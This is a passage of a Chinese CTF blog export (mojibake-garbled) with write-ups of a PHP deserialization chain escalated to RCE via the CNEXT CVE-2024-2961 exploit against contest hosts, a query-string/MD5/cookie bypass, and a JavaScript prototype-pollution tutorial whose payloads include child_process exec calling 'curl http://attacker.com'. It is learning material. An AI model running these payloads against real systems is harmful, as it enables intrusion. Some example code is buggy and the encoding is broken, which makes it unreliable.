PYTHON_GET_PIP_SHA256=ce486cddac44e99496a702aa5c06c5028414ef48fdfd5242cd2fe559b13d4348 FLAG=NSSCTF{f9f794c5-47f3-47b2-b473-4881097d212f} å¾—åˆ°flag\n3.fileread\ræç¤ºcnext\ncnextæ˜¯ PHPåˆ©ç”¨GNU C Iconvå°†æ–‡ä»¶è¯»å–å˜æˆRCEï¼ˆCVE-2024-2961ï¼‰\nGNU C æ˜¯ä¸€ä¸ªæ ‡å‡†çš„ISO Cä¾èµ–åº“ã€‚åœ¨GNU Cä¸­ï¼Œiconv()å‡½æ•°2.39åŠä»¥å‰å­˜åœ¨ä¸€å¤„ç¼“å†²åŒºæº¢å‡ºæ¼æ´ï¼Œè¿™å¯èƒ½ä¼šå¯¼è‡´åº”ç”¨ç¨‹åºå´©æºƒæˆ–è¦†ç›–ç›¸é‚»å˜é‡ã€‚\nå¦‚æœä¸€ä¸ªPHPåº”ç”¨ä¸­å­˜åœ¨ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨iconv()çš„è¿™ä¸ªCVE-2024-2961æ¼æ´ï¼Œå°†å…¶æå‡ä¸ºä»£ç æ‰§è¡Œæ¼æ´ã€‚\nå…ˆæ¥çœ‹çœ‹ååºåˆ—åŒ–\næºç ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 \u0026lt;?php class Smile { public $hello = \u0026#39;\u0026#39;; public $user = \u0026#39;guest\u0026#39;; function show() { if ($this-\u0026gt;user == \u0026#39;adm1n\u0026#39;) { echo \u0026#39;Hello admin, here is your flag: \u0026#39;.$this-\u0026gt;hello-\u0026gt;flag; } else { echo \u0026#39;Hello \u0026#39;.$this-\u0026gt;user; highlight_file(__FILE__); } } function __destruct() { $this-\u0026gt;show(); } function __invoke() { if (preg_match(\u0026#39;/^hello$/\u0026#39;, $this-\u0026gt;hello)) { echo \u0026#34;flagå°±æ˜¯é‚£ä¸ªåœ¨æ ¹ç›®å½•ä¸‹çš„flag\u0026#34;; } } } class Lucky { public $chmod = \u0026#39;0700\u0026#39;; public $filename = \u0026#39;\u0026#39;; function __wakeup() { $this-\u0026gt;filename = $_GET[\u0026#39;file\u0026#39;]; } function __toString() { echo \u0026#34;Your File: \u0026#34;.file_get_contents($this-\u0026gt;filename).\u0026#34;\\n\\n\u0026#34;; return \u0026#39;huh?\u0026#39;; } } class Happy { public $func = \u0026#39;\u0026#39;; public $param = []; function call_func($func) { if (!$this-\u0026gt;param) { call_user_func(\u0026#39;phpinfo\u0026#39;); } else { call_user_func($func, \u0026#34;locked\u0026#34;); } } function __get($var) { if ($this-\u0026gt;func) { $this-\u0026gt;call_func($this-\u0026gt;func); } else { die(); } return \u0026#39;hacker!\u0026#39;; } } function Yeah($ser) { unserialize(base64_decode($ser)); } @error_reporting(0); if (!empty($_GET)) { $param = $_GET[\u0026#39;p\u0026#39;]; call_user_func(\u0026#34;Yeah\u0026#34;, $param); } else { $face = new Smile(); die(); } ?\u0026gt; popé“¾æ˜¯__destruct()-\u0026gt; __get -\u0026gt; __invoke() -\u0026gt; __toString()\n1 2 3 4 php echo base64_encode(serialize(new Smile(new Happy(new Smile(new Lucky(\u0026#39;0700\u0026#39;,\u0026#39;\u0026#39;),\u0026#39;\u0026#39;),\u0026#39;114\u0026#39;),\u0026#39;adm1n\u0026#39;))); //Tzo1OiJTbWlsZSI6Mjp7czo1OiJoZWxsbyI7Tzo1OiJIYXBweSI6Mjp7czo0OiJmdW5jIjtPOjU6IlNtaWxlIjoyOntzOjU6ImhlbGxvIjtPOjU6Ikx1Y2t5IjoyOntzOjU6ImNobW9kIjtzOjQ6IjA3MDAiO3M6ODoiZmlsZW5hbWUiO3M6MDoiIjt9czo0OiJ1c2VyIjtzOjA6IiI7fXM6NToicGFyYW0iO3M6MzoiMTE0Ijt9czo0OiJ1c2VyIjtzOjU6ImFkbTFuIjt9 æˆ‘ä»¬ä½¿ç”¨å¯ä»¥è‡ªåŠ¨åˆ©ç”¨cnextæ¼æ´çš„è„šæœ¬ï¼š\nCNEXT exploits\næ”¹ä¸‹è„šæœ¬ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 python ...... class Remote: def __init__(self, url: str) -\u0026gt; None: self.url = url self.session = Session() def send(self, path: str) -\u0026gt; Response: \u0026#34;\u0026#34;\u0026#34;Sends given `path` to the HTTP server. Returns the response. \u0026#34;\u0026#34;\u0026#34; return self.session.get(\u0026#34;http://contest.ctf.nefu.edu.cn:33069/? p=Tzo1OiJTbWlsZSI6Mjp7czo1OiJoZWxsbyI7Tzo1OiJIYXBweSI6Mjp7czo0OiJmdW5jIjtPOjU6IlNt aWxlIjoyOntzOjU6ImhlbGxvIjtPOjU6Ikx1Y2t5IjoyOntzOjU6ImNobW9kIjtzOjQ6IjA3MDAiO3M6OD oiZmlsZW5hbWUiO3M6MDoiIjt9czo0OiJ1c2VyIjtzOjU6Imd1ZXN0Ijt9czo1OiJwYXJhbSI7czozOiIx MTEiO31zOjQ6InVzZXIiO3M6NToiYWRtMW4iO30=\u0026#34;, params={\u0026#34;file\u0026#34;: path}) def download(self, path: str) -\u0026gt; bytes: \u0026#34;\u0026#34;\u0026#34;Returns the contents of a remote file. \u0026#34;\u0026#34;\u0026#34; path = f\u0026#34;php://filter/convert.base64-encode/resource={path}\u0026#34; response = self.send(path) data = response.re.search(\u0026#34;Your File: (.*)\\n\\n\u0026#34;, flags=re.S).group(1) return base64.decode(data) ...... bash â”Œâ”€â”€(kaliã‰¿kali)-[~/cnext-exploits] â””â”€$ python3 cnext-exploit.py http://contest.ctf.nefu.edu.cn:33100/ \u0026#39;ls -a / \u0026gt; 1.txt\u0026#39; [*] The data:// wrapper works [*] The php://filter/ wrapper works [*] The zlib extension is enabled [+] Exploit preconditions are satisfied [*] Using 0x7fdfdb200040 as heap EXPLOIT SUCCESS æŸ¥çœ‹æ ¹ç›®å½•\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 . .. .dockerenv bin boot dev etc flag home lib lib64 media mnt opt proc readflag root run sbin srv start.sh sys tmp usr var è¿™é‡Œæœ‰readflagï¼Œå¬å¤å¸ˆå‚…è¯´è¿™é‡Œæ˜¯SUIDï¼Œæ‰€ä»¥ç›´æ¥è¿è¡Œreadflag\n1 2 3 4 5 6 7 8 9 10 bash â”Œâ”€â”€(kaliã‰¿kali)-[~/cnext-exploits] â””â”€$ python3 cnext-exploit.py http://contest.ctf.nefu.edu.cn:33100/ \u0026#39;/./readflag \u0026gt; 1.txt\u0026#39; [*] The data:// wrapper works [*] The php://filter/ wrapper works [*] The zlib extension is enabled [+] Exploit preconditions are satisfied [*] Using 0x7fdfdb200040 as heap EXPLOIT SUCCESS å¾—åˆ°flag\n","date":"2025-06-01T10:30:20+08:00","permalink":"https://Oight.github.io/p/nsilab%E6%B7%98%E6%B1%B0%E8%B5%9B%E5%A4%8D%E7%8E%B0/","title":"NSILABæ·˜æ±°èµ›å¤ç°"},{"content":"1.sign in\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 \u0026lt;?php error_reporting(0); include_once \u0026#39;flag.php\u0026#39;; if ($_SERVER[\u0026#39;QUERY_STRING\u0026#39;]) { if (preg_match(\u0026#34;/[A-Za-z]+/\u0026#34;, $_SERVER[\u0026#39;QUERY_STRING\u0026#39;])) { die(\u0026#34;I hate English!\u0026#34;); } if (substr(md5($_POST[\u0026#39;nsilab\u0026#39;]), 0, 4) !== \u0026#34;ba3f\u0026#34; || $_GET[\u0026#39;hi\u0026#39;] !== \u0026#34;web\u0026#34;) { die(\u0026#34;Oops! It\u0026#39;s wrong!\u0026#34;); } if ($_COOKIE[\u0026#39;user\u0026#39;] !== \u0026#39;admin\u0026#39;) { die(\u0026#34;You are not admin!\u0026#34;); } locate(); } else { highlight_file(__FILE__); } ?\u0026gt; ä¸‰å±‚è¿‡æ»¤ ä»¥ä¸‹æ˜¯å¯¹è¯¥PHPä»£ç çš„è¯¦ç»†è§£é‡ŠåŠè§£é¢˜æ€è·¯ï¼š\nä»£ç é€»è¾‘åˆ†æ\ré”™è¯¯æŠ¥å‘Šä¸æ–‡ä»¶åŒ…å«ï¼š\n1 2 3 php error_reporting(0); // å…³é—­é”™è¯¯æ˜¾ç¤º include_once \u0026#39;flag.php\u0026#39;; // åŒ…å«flagæ–‡ä»¶ï¼ˆå…³é”®ç›®æ ‡ï¼‰ æŸ¥è¯¢å­—ç¬¦ä¸²æ£€æŸ¥ï¼š\n1 2 3 4 5 6 7 8 9 10 php if ($_SERVER[\u0026#39;QUERY_STRING\u0026#39;]) { // æ£€æŸ¥æŸ¥è¯¢å­—ç¬¦ä¸²æ˜¯å¦åŒ…å«å­—æ¯ if (preg_match(\u0026#34;/[A-Za-z]+/\u0026#34;, $_SERVER[\u0026#39;QUERY_STRING\u0026#39;])) { die(\u0026#34;I hate English!\u0026#34;); } // å…¶ä»–æ¡ä»¶... } else { highlight_file(__FILE__); // æ— æŸ¥è¯¢å­—ç¬¦ä¸²æ—¶æ˜¾ç¤ºæºç  } æ¼æ´ç‚¹ï¼š$_SERVER['QUERY_STRING'] æ˜¯åŸå§‹æœªè§£ç çš„å­—ç¬¦ä¸²ï¼Œå¯é€šè¿‡URLç¼–ç ç»•è¿‡å­—æ¯æ£€æµ‹ã€‚ MD5æ ¡éªŒä¸å‚æ•°æ£€æŸ¥ï¼š\n1 2 3 4 php if (substr(md5($_POST[\u0026#39;nsilab\u0026#39;]), 0, 4) !== \u0026#34;ba3f\u0026#34; || $_GET[\u0026#39;hi\u0026#39;] !== \u0026#34;web\u0026#34;) { die(\u0026#34;Oops! It\u0026#39;s wrong!\u0026#34;); } è¦æ±‚POSTå‚æ•° nsilab çš„MD5å€¼å‰4ä½ä¸º ba3fã€‚ GETå‚æ•° hi å¿…é¡»ç­‰äº webã€‚ Cookieæƒé™æ ¡éªŒï¼š\n1 2 3 4 php if ($_COOKIE[\u0026#39;user\u0026#39;] !== \u0026#39;admin\u0026#39;) { die(\u0026#34;You are not admin!\u0026#34;); } éœ€è®¾ç½®Cookie user=adminã€‚ æˆåŠŸæ¡ä»¶ï¼š\n1 2 php locate(); // çŒœæµ‹æ­¤å‡½æ•°ä¼šè¾“å‡ºflag è§£é¢˜æ­¥éª¤\r1. ç»•è¿‡æŸ¥è¯¢å­—ç¬¦ä¸²å­—æ¯æ£€æµ‹\rç›®æ ‡ï¼šä¼ é€’ hi=webï¼Œä½†ç¡®ä¿ QUERY_STRING æ— å­—æ¯ã€‚\næ–¹æ³•\nï¼šå°†å‚æ•°åå’Œå€¼URLç¼–ç ä¸ºåå…­è¿›åˆ¶å½¢å¼ï¼š\nhi â†’ %68%69ï¼ˆhçš„ASCIIç æ˜¯0x68ï¼Œiæ˜¯0x69ï¼‰ web â†’ %77%65%62ï¼ˆw=0x77, e=0x65, b=0x62ï¼‰ æ„é€ æŸ¥è¯¢å­—ç¬¦ä¸²\nï¼š\n1 2 plaintext ?%68%69=%77%65%62 $_SERVER['QUERY_STRING'] ä¸º %68%69=%77%65%62ï¼ˆæ— å­—æ¯ï¼‰ã€‚ PHPè‡ªåŠ¨è§£ç åï¼Œ$_GET['hi'] ä¸º webã€‚ 2. ç¢°æ’MD5å‰4ä½ä¸ºba3f\rç›®æ ‡ï¼šæ‰¾åˆ°å­—ç¬¦ä¸² nsilabï¼Œæ»¡è¶³ md5(nsilab)[0:4] == \u0026quot;ba3f\u0026quot;ã€‚\næš´åŠ›ç ´è§£è„šæœ¬\nï¼š\n1 2 3 4 5 6 7 8 9 10 11 python import hashlib target = \u0026#34;ba3f\u0026#34; for i in range(1000000): s = str(i) hash_md5 = hashlib.md5(s.encode()).hexdigest() if hash_md5.startswith(target): print(f\u0026#34;Found: {s} â†’ {hash_md5}\u0026#34;) break // Found: 35350 â†’ ba3fe3d296f3e7269b66f163d31b3dc3 ç¤ºä¾‹ç»“æœï¼šnsilab=35350 3. è®¾ç½®ç®¡ç†å‘˜Cookie\ræ·»åŠ Cookieï¼šuser=adminã€‚ 4. å‘é€å®Œæ•´è¯·æ±‚\r1 2 3 4 5 6 7 http GET /?%68%69=%77%65%62 HTTP/1.1 Host: target.com Cookie: user=admin Content-Type: application/x-www-form-urlencoded nsilab=12345 æ¼æ´æ€»ç»“\ræ¼æ´ç±»å‹ åˆ©ç”¨æ–¹æ³• é˜²å¾¡å»ºè®® URLç¼–ç ç»•è¿‡ å‚æ•°åå’Œå€¼URLç¼–ç ä¸ºåå…­è¿›åˆ¶ æ£€æŸ¥è§£ç åçš„å‚æ•° MD5å¼±æ ¡éªŒ æš´åŠ›ç¢°æ’å‰4ä½ ä½¿ç”¨å¼ºå“ˆå¸Œï¼ˆå¦‚SHA-256ï¼‰ Cookieæƒé™æ§åˆ¶ä¸ä¸¥ ç›´æ¥è®¾ç½®Cookieä¸ºuser=admin æœåŠ¡ç«¯Sessionç®¡ç†æˆ–ç­¾åCookie æœ€ç»ˆPayloadç¤ºä¾‹\r1 2 3 4 bash curl -X GET \u0026#34;http://contest.ctf.nefu.edu.cn:33079/\u0026#34; \\ -H \u0026#34;Cookie: user=admin\u0026#34; \\ -d \u0026#34;nsilab=35350\u0026#34; æˆåŠŸè§¦å‘åï¼ŒæœåŠ¡å™¨ä¼šæ‰§è¡Œ locate() å‡½æ•°å¹¶è¿”å›flagã€‚\n2.ezssti\rè¾“å…¥49 å‘ç°å¯ä»¥SSTI ä½¿ç”¨ç„šé– get æ–¹æ³•ä¼ name\ncd .. \u0026amp;\u0026amp; ls -a\nå¾—åˆ°éšè—çš„.flll4gggggæ–‡ä»¶ ç”¨tac /.flll4gggggå¾—åˆ°flag\nArt\rå­¦å§æ‰‹æŠŠæ‰‹æ•™å­¦ï¼Œæ•ˆæœæ˜¾è‘—ï¼ˆï¼‰\rçµæ„Ÿæ¥æºï¼šArtfuscator\nIDAæ‰“å¼€ï¼Œè¿›å…¥mainå‡½æ•°\nCtrl åŠ æ»šè½®æ”¾å¤§\nå°±èƒ½çœ‹åˆ°flag\n","date":"2025-06-01T10:30:04+08:00","permalink":"https://Oight.github.io/p/%E6%B7%98%E6%B1%B0%E8%B5%9B/","title":"æ·˜æ±°èµ›"},{"content":"åŸå‹é“¾æ±¡æŸ“\rä»€ä¹ˆæ˜¯åŸå‹é“¾æ±¡æŸ“ï¼Ÿ\råŸå‹é“¾æ±¡æŸ“æ˜¯ä¸€ç§é’ˆå¯¹JavaScriptè¿è¡Œæ—¶çš„æ³¨å…¥æ”»å‡»ã€‚\nåœ¨ JavaScript ä¸­ï¼Œé€šè¿‡ä¿®æ”¹å¯¹è±¡çš„åŸå‹ï¼ˆprototypeï¼‰ï¼Œè®©æ‰€æœ‰ç»§æ‰¿è¯¥åŸå‹çš„å¯¹è±¡éƒ½â€œè¢«åŠ¨ç»§æ‰¿â€è¿™äº›ä¿®æ”¹ï¼Œå¯èƒ½å¯¼è‡´æ„å¤–è¡Œä¸ºæˆ–å®‰å…¨æ¼æ´ã€‚\né€šè¿‡åŸå‹é“¾æ±¡æŸ“ï¼Œæ”»å‡»è€…å¯ä»¥æ§åˆ¶å¯¹è±¡å±æ€§çš„é»˜è®¤å€¼ï¼Œä»è€Œç¯¡æ”¹åº”ç”¨ç¨‹åºçš„é€»è¾‘å¹¶å¯èƒ½å¯¼è‡´æœåŠ¡è¢«æ‹’ç»ï¼Œç”šè‡³åœ¨æŸäº›æç«¯æƒ…å†µä¸‹è¿œç¨‹æ‰§è¡Œä»£ç ã€‚\né€šä¿—åœ°è®²ï¼Œæƒ³æƒ³ä½ æ˜¯ä¸€å®¶è½¦å‚çš„è€æ¿ï¼Œæ‰€æœ‰æ±½è½¦éƒ½æŒ‰ç…§ä¸€ä¸ª æ ‡å‡†æ¨¡æ¿ ç”Ÿæˆï¼Œè¿™ä¸ªæ¨¡æ¿å°±æ˜¯ åŸå‹ã€‚æœ‰ä¸€å¤©ï¼Œæœ‰äººåœ¨æ¨¡æ¿ä¸Šå·å·ç”»äº†ä¸ªé¬¼è„¸ï¼Œç»“æœä¹‹åç”Ÿäº§çš„æ¯è¾†è½¦éƒ½å¸¦ç€è¿™ä¸ªé¬¼è„¸â€”â€”è¿™å°±æ˜¯åŸå‹é“¾æ±¡æŸ“ã€‚\nä¸ºä»€ä¹ˆä¼šå‘ç”ŸåŸå‹é“¾æ±¡æŸ“ï¼Ÿ\råŸå‹é“¾æœºåˆ¶ JavaScript ä¸­å¯¹è±¡å¯ä»¥ç»§æ‰¿å±æ€§å’Œæ–¹æ³•ã€‚ä¸ºäº†ä½¿å¾—åœ¨ç¼–å†™ç¨‹åºæ—¶æ›´åŠ ç®€ä¾¿ï¼Œé¿å…ç”±äºæ–¹æ³•ç»‘å®šåˆ°å¯¹è±¡ä¸Šåœ¨ä½¿ç”¨æ—¶å¤šæ¬¡è°ƒç”¨ï¼Œåˆ©ç”¨åŸå‹ï¼ˆprototypeï¼‰å°±å¯ä»¥ä½¿å¾—æ‰€æœ‰ç”¨åŒä¸€ç±»æ¥å®ä¾‹åŒ–çš„å¯¹è±¡å¯ä»¥ç›´æ¥æ‹¥æœ‰è¿™ä¸ªç±»ä¸­çš„æ‰€æœ‰å†…å®¹ï¼ŒåŒ…æ‹¬å±æ€§å’Œæ–¹æ³•ã€‚\nJavaScript ä¸­çš„ç»§æ‰¿æœºåˆ¶ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 javascript funtion Father() { this.first_name = \u0026#39;Donald\u0026#39; this.last_name = \u0026#39;Trump\u0026#39; } funtion Son() { this.first_name = \u0026#39;Melania\u0026#39; } Son.prototype = new Father() let Son = new Son() console.log(`name: ${son.first_name} ${son.last_name}`) // æœ€åè¾“å‡ºName : Melania Trump æ€»ç»“ä¸€ä¸‹ï¼Œå¯¹äºå¯¹è±¡ son ï¼Œåœ¨è°ƒç”¨ son.last_name çš„æ—¶å€™ï¼Œå®é™…ä¸Š JavaScript å¼•æ“ä¼šè¿›è¡Œå¦‚ä¸‹æ“ä½œï¼š\n1.åœ¨å¯¹è±¡ son ä¸­å¯»æ‰¾ last_name 2.å¦‚æœæ‰¾ä¸åˆ°ï¼Œåˆ™åœ¨son.__proto__ä¸­å¯»æ‰¾ last_name 3.å¦‚æœä»ç„¶æ‰¾ä¸åˆ°ï¼Œåˆ™ç»§ç»­åœ¨son.__proto__.__proto__ä¸­å¯»æ‰¾ last_name 4.ä¾æ¬¡å¯»æ‰¾ï¼Œç›´åˆ°æ‰¾åˆ° null ç»“æŸã€‚æ¯”å¦‚ï¼ŒObject.prototypeçš„__proto__å°±æ˜¯ null\nJavaScript çš„è¿™ä¸ªæŸ¥æ‰¾çš„æœºåˆ¶ï¼Œè¢«è¿ç”¨åœ¨é¢å‘å¯¹è±¡çš„ç»§æ‰¿ä¸­ï¼Œè¢«ç§°ä½œ prototype ç»§æ‰¿é“¾ã€‚\nä½†æ˜¯è¿™ä¸€æ“ä½œä¹Ÿä½¿å¾—ä¸€æ—¦å¯ä»¥ä¿®æ”¹å¯¹è±¡çš„åŸå‹ï¼Œå°†ä½¿å¾—æ‰€æœ‰çš„å¯¹è±¡éƒ½è¢«ä¿®æ”¹ï¼Œä»è€Œå¯¼è‡´å®‰å…¨éšæ‚£ã€‚\nä¾‹å¦‚ï¼š\n1 2 3 javascript const cat1 = {}; // æ™®é€šå¯¹è±¡ car1.toString(); // è°ƒç”¨çš„æ—¶Object.prototype.toString å¦‚æœä¿®æ”¹äº†Object.orototype.toString,æ‰€æœ‰å¯¹è±¡çš„toStringæ–¹æ³•éƒ½ä¼šå˜ã€‚\nä¸¾ä¸€ä¸ªå®é™…åˆ©ç”¨ä¸­çš„ä¾‹å­\nå‡è®¾ä¸€ä¸ªç½‘ç«™å…è®¸ç”¨æˆ·æäº¤JSONæ•°æ®ï¼š\n1 2 3 javascript const userData = JSON.parse(\u0026#39;{\u0026#34;__proto__\u0026#34;:\u0026#34;isAdmin: true\u0026#34;}\u0026#39;); // ç”¨æˆ·æäº¤çš„æ•°æ®ä¸­å·å·åŠ äº†__proto__.isAdmin = true æ­¤æ—¶ï¼ŒObject.prototype.isAdminè¢«è®¾ç½®ä¸º true ï¼Œæ‰€æœ‰å¯¹è±¡éƒ½ä¼šç»§æ‰¿è¿™ä¸ªå±æ€§ï¼š\n1 2 3 javascript const normalUser = {}; console.log(normalUser.isAdmin); // è¾“å‡ºtrueï¼Œ(æœ¬ä¸è¯¥æœ‰ç®¡ç†æƒé™) å…·ä½“åœ¨CTFä¸­çš„åº”ç”¨\rå¦‚ä½•åˆ¤æ–­é¢˜ç›®è®¾è®¡åŸå‹é“¾æ±¡æŸ“ï¼Ÿ\r1.ä»£ç å®¡è®¡\nå¯¹è±¡åˆå¹¶æ“ä½œï¼šé¢˜ç›®ä»£ç ä¸­å‡ºç°Object.assign()ã€lodash.marge()ã€JSON.parse()ç­‰å‡½æ•° åŠ¨æ€å±æ€§èµ‹å€¼ï¼šå¦‚obj[key] = value,å…¶ä¸­keyæˆ–valueæ¥è‡ªç”¨æˆ·è¾“å…¥ åŸå‹é“¾å…³é”®è¯ï¼šä»£ç ä¸­æ˜¾å¼ä½¿ç”¨__proto__ã€prototypeã€constructor 2.é»‘ç®±æµ‹è¯•ç‰¹å¾\næƒé™å¼‚å¸¸ï¼šæ™®é€šç”¨æˆ·çªç„¶æ‹¥æœ‰ç®¡ç†å‘˜æƒé™ï¼Œ(å¦‚è®¿é—®/admin è·¯ç”±) å…¨å±€å±æ€§ç¯¡æ”¹: æ‰€æœ‰å¯¹è±¡è‡ªåŠ¨ç»§æ‰¿æŸä¸ªå±æ€§(å¦‚ token ã€isAdmin ) è¡Œä¸ºçªå˜ï¼š è°ƒç”¨é»˜è®¤æ–¹æ³•(å¦‚toString())æ—¶è¿”å›æ„å¤–ç»“æœ 3.éªŒè¯æ–¹æ³•\næäº¤æµ‹è¯•Payloadï¼š\n1 {\u0026#34;__proto__\u0026#34;: {\u0026#34;test\u0026#34;: 123}} æ£€æŸ¥å“åº”ï¼š\nåˆ›å»ºæ–°å¯¹è±¡ const obj = {};ï¼Œè§‚å¯Ÿ obj.test æ˜¯å¦ä¸º 123ã€‚ è‹¥æˆåŠŸï¼Œè¯´æ˜åŸå‹é“¾è¢«æ±¡æŸ“ã€‚ çªç ´å£ä¸åˆ©ç”¨åœºæ™¯\r1.å¸¸è§è¾“å…¥ç‚¹ï¼š\nJSONæ•°æ®æäº¤ï¼šé€šè¿‡POSTè¯·æ±‚ä½“ä¼ é€’æ¶æ„Payloadã€‚ URLå‚æ•°æˆ–æŸ¥è¯¢å­—ç¬¦ä¸²ï¼šå¦‚ ?key=proto.isAdmin\u0026amp;value=trueã€‚ è¡¨å•å­—æ®µï¼šç”¨æˆ·å¯æ§çš„è¡¨å•å­—æ®µåæˆ–å€¼ã€‚ 2.æ•æ„Ÿå±æ€§è¦†ç›–ï¼š\næƒé™æ ‡å¿—ï¼šisAdminã€isVIPã€roleã€‚ èº«ä»½å‡­è¯ï¼štokenã€sessionã€‚ å‡½æ•°é‡å†™ï¼šè¦†ç›– toString()ã€valueOf() ç­‰åŸå‹æ–¹æ³•ï¼Œè§¦å‘é€»è¾‘æ¼æ´ã€‚ 3.ä¾èµ–åº“æ¼æ´ï¼š\nLodashï¼ˆCVE-2019-10744ï¼‰ï¼šæ—§ç‰ˆæœ¬çš„ _.defaultsDeep æœªè¿‡æ»¤ protoã€‚ Express.jsä¸­é—´ä»¶ï¼šè§£æè¯·æ±‚ä½“æ—¶æœªè¿‡æ»¤ç‰¹æ®Šå±æ€§ã€‚ å…·ä½“æ“ä½œæ­¥éª¤\ræ­¥éª¤ä¸€ï¼šæ„å»ºPayload\nåŸºç¡€Payloadï¼š\n1 2 json {\u0026#34;__proto__\u0026#34;:{\u0026#34;isAdmin\u0026#34;: true}} ç»•è¿‡è¿‡æ»¤çš„å˜ç§ï¼š\nUnicodeç¼–ç ï¼š 1 2 json {\u0026#34;\\u005F_proto__\u0026#34;: {\u0026#34;isAdmin\u0026#34;: true}} åµŒå¥—æ±¡æŸ“ï¼š 1 2 json {\u0026#34;constructor\u0026#34;: {\u0026#34;prototype\u0026#34;: {\u0026#34;isAdmin\u0026#34;: true}}} æ­¥éª¤2ï¼šè§¦å‘æ¼æ´\nåœºæ™¯1ï¼šå¯¹è±¡åˆå¹¶ï¼ˆå¦‚ Object.assignï¼‰ï¼š 1 2 3 4 5 javascript // æœåŠ¡ç«¯ä»£ç ç¤ºä¾‹ const userInput = JSON.parse(req.body.data); const config = { theme: \u0026#34;light\u0026#34; }; Object.assign(config, userInput); // æ±¡æŸ“ç‚¹ Payloadæäº¤ï¼š\n1 {\u0026#34;__proto__\u0026#34;: {\u0026#34;isAdmin\u0026#34;: true}} åœºæ™¯2ï¼šåŠ¨æ€å±æ€§èµ‹å€¼ï¼š 1 2 3 4 // æœåŠ¡ç«¯ä»£ç ç¤ºä¾‹ const key = req.query.key; // ç”¨æˆ·å¯æ§ const value = req.query.value; obj[key] = value; Payloadæäº¤ï¼š\n1 GET /api/set?key=**proto**.isAdmin\u0026amp;value=true plaintext\næ­¥éª¤3ï¼šéªŒè¯æ±¡æŸ“æ•ˆæœ\nç›´æ¥æ£€æŸ¥åŸå‹å±æ€§ï¼š 1 console.log(Object.prototype.isAdmin); // è¾“å‡ºåº”ä¸º true è§¦å‘æ•æ„Ÿé€»è¾‘ï¼š\nè®¿é—®éœ€è¦ç®¡ç†å‘˜æƒé™çš„æ¥å£ï¼ˆå¦‚ /adminï¼‰ã€‚ è°ƒç”¨è¢«è¦†ç›–çš„æ–¹æ³•ï¼š 1 2 3 javascript const obj = {}; console.log(obj.toString()); // è‹¥è¦†ç›–ä¸ºæ¶æ„å‡½æ•°ï¼Œå¯èƒ½è§¦å‘XSSæˆ–RCE æ­¥éª¤4ï¼šé«˜çº§åˆ©ç”¨ï¼ˆç»“åˆå…¶ä»–æ¼æ´ï¼‰\nè¿œç¨‹ä»£ç æ‰§è¡Œï¼ˆRCEï¼‰ï¼š 1 2 3 4 json {\u0026#34;__proto__\u0026#34;: { \u0026#34;exec\u0026#34;: \u0026#34;require(\u0026#39;child_process\u0026#39;).exec(\u0026#39;curl http://attacker.com\u0026#39;)\u0026#34; }} ä¿¡æ¯æ³„éœ²ï¼š\n1 2 3 4 json {\u0026#34;__proto__\u0026#34;: { \u0026#34;getSecret\u0026#34;: function() { return this.internalSecret; } }} å››ã€ç»•è¿‡é˜²å¾¡çš„æŠ€å·§\n1.å±æ€§åæ··æ·†ï¼š\nå¤§å°å†™å˜å¼‚ï¼š__PROTO__ã€__proto__ã€‚\nç‰¹æ®Šå­—ç¬¦æ’å…¥ï¼š__pro__to__ï¼ˆéƒ¨åˆ†è¿‡æ»¤é€»è¾‘ä¸ä¸¥æ ¼ï¼‰ã€‚\n2.å¤šå±‚åµŒå¥—æ±¡æŸ“ï¼š\n1 {\u0026#34;a\u0026#34;: {\u0026#34;b\u0026#34;: {\u0026#34;__proto__\u0026#34;: {\u0026#34;isAdmin\u0026#34;: true}}}} æŸäº›åˆå¹¶å‡½æ•°å¯èƒ½é€’å½’å¤„ç†åµŒå¥—å¯¹è±¡ã€‚\n3.åˆ©ç”¨åº“å‡½æ•°ç‰¹æ€§ï¼š\nLodashæ—§ç‰ˆæœ¬ï¼š_.merge é»˜è®¤å¤„ç† protoã€‚\njQuery.extendï¼šéœ€æµ‹è¯•æ˜¯å¦æ·±æ‹·è´åŸå‹å±æ€§ã€‚\nä¾‹é¢˜ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 // ... const lodash = require(\u0026#39;lodash\u0026#39;) // ... app.engine(\u0026#39;ejs\u0026#39;, function (filePath, options, callback) { // define the template engine fs.readFile(filePath, (err, content) =\u0026gt; { if (err) return callback(new Error(err)) let compiled = lodash.template(content) let rendered = compiled({...options}) return callback(null, rendered) }) }) //... app.all(\u0026#39;/\u0026#39;, (req, res) =\u0026gt; { let data = req.session.data || {language: [], category: []} if (req.method == \u0026#39;POST\u0026#39;) { data = lodash.merge(data, req.body) req.session.data = data } res.render(\u0026#39;index\u0026#39;, { language: data.language, category: data.category }) }) è§£å†³æ­¥éª¤ä¸åŸç†è¯¦è§£\r1. æ¼æ´åˆ†æ\ré¢˜ç›®ä»£ç ä¸­ä½¿ç”¨äº†å­˜åœ¨æ¼æ´çš„ lodash.merge æ–¹æ³•åˆå¹¶ç”¨æˆ·è¾“å…¥ï¼ˆreq.bodyï¼‰ï¼Œä¸”æœªè¿‡æ»¤ __proto__ æˆ– constructor å±æ€§ã€‚æ—§ç‰ˆ Lodashï¼ˆå¦‚ 4.17.10 ä¹‹å‰ï¼‰çš„ merge æ–¹æ³•æœªæ­£ç¡®å¤„ç†åŸå‹é“¾å±æ€§ï¼Œå¯¼è‡´æ”»å‡»è€…å¯é€šè¿‡æ³¨å…¥ __proto__ æ±¡æŸ“å…¨å±€å¯¹è±¡åŸå‹ã€‚\n2. æ¼æ´åˆ©ç”¨æ­¥éª¤\ræ­¥éª¤1ï¼šç¡®è®¤æ¼æ´å­˜åœ¨\ræµ‹è¯•Payload\nï¼šå‘é€ä»¥ä¸‹ POST è¯·æ±‚ï¼Œå°è¯•æ±¡æŸ“\n1 Object.prototype ï¼š\n1 2 3 4 5 6 json { 